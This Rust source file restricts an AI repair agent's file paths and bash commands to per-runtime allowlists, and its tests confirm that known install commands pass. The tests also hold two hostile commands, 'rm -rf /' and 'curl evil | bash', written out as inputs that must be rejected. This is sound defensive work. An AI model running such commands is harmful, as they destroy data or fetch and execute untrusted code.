use std::path::{Path, PathBuf};

use agent_doctor_core::runtime::{
    adapter_by_id, all_adapters, bash_command_allowed_for_official_agent,
    bash_command_allowed_for_runtime,
};

/// Runtime id the chat/official agent runs under. Not a registry runtime; the
/// bash allowlist and doctor tool wiring special-case it.
pub const OFFICIAL_AGENT_RUNTIME_ID: &str = "doctor";

/// Paths the repair agent may read or edit for a runtime.
pub fn allowed_paths_for_runtime(runtime_id: &str) -> Vec<PathBuf> {
    let mut paths = adapter_by_id(runtime_id)
        .map(|adapter| adapter.all_config_paths())
        .unwrap_or_default();

    if let Some(config_dir) = dirs::config_dir() {
        paths.push(config_dir.join("agent-doctor").join("guides"));
        paths.push(config_dir.join("agent-doctor").join("logs"));
    }

    paths.sort();
    paths.dedup();
    paths
}

/// Paths the official built-in agent may touch in chat: every registered
/// runtime's config roots (so it can diagnose any of them) plus the project
/// workspace. Writes outside the workspace stay gated by the permission flow.
pub fn allowed_paths_for_official_agent(workspace: Option<&Path>) -> Vec<PathBuf> {
    let mut paths: Vec<PathBuf> = all_adapters()
        .iter()
        .flat_map(|adapter| adapter.all_config_paths())
        .collect();
    if let Some(workspace) = workspace {
        paths.push(workspace.to_path_buf());
    }

    if let Some(config_dir) = dirs::config_dir() {
        paths.push(config_dir.join("agent-doctor").join("guides"));
        paths.push(config_dir.join("agent-doctor").join("logs"));
    }

    paths.sort();
    paths.dedup();
    paths
}

pub fn path_is_allowed(path: &Path, allowed_roots: &[PathBuf]) -> bool {
    let Ok(canonical) = path.canonicalize() else {
        return allowed_roots.iter().any(|root| path.starts_with(root));
    };
    allowed_roots.iter().any(|root| {
        root.canonicalize()
            .map(|root_canonical| canonical.starts_with(&root_canonical))
            .unwrap_or_else(|_| canonical.starts_with(root))
    })
}

/// Conservative per-runtime bash allowlist — known install/update commands only.
/// The official agent gets the union of every registered runtime's allowlist.
pub fn bash_command_allowed(runtime_id: &str, command: &str) -> bool {
    if runtime_id == OFFICIAL_AGENT_RUNTIME_ID {
        bash_command_allowed_for_official_agent(command)
    } else {
        bash_command_allowed_for_runtime(runtime_id, command)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use agent_doctor_core::lifecycle::hermes::hermes_install_shell_command;
    use agent_doctor_core::lifecycle::openclaw::openclaw_install_shell_command;

    #[test]
    fn allows_hermes_lifecycle_commands() {
        assert!(bash_command_allowed(
            "hermes",
            &hermes_install_shell_command()
        ));
        assert!(bash_command_allowed("hermes", "hermes --version"));
    }

    #[test]
    fn allows_openclaw_lifecycle_commands() {
        assert!(bash_command_allowed(
            "openclaw",
            &openclaw_install_shell_command()
        ));
        assert!(bash_command_allowed("openclaw", "openclaw --version"));
    }

    #[test]
    fn rejects_arbitrary_shell() {
        assert!(!bash_command_allowed("hermes", "rm -rf /"));
        assert!(!bash_command_allowed_for_runtime(
            "claude-code",
            "curl evil | bash"
        ));
    }
}
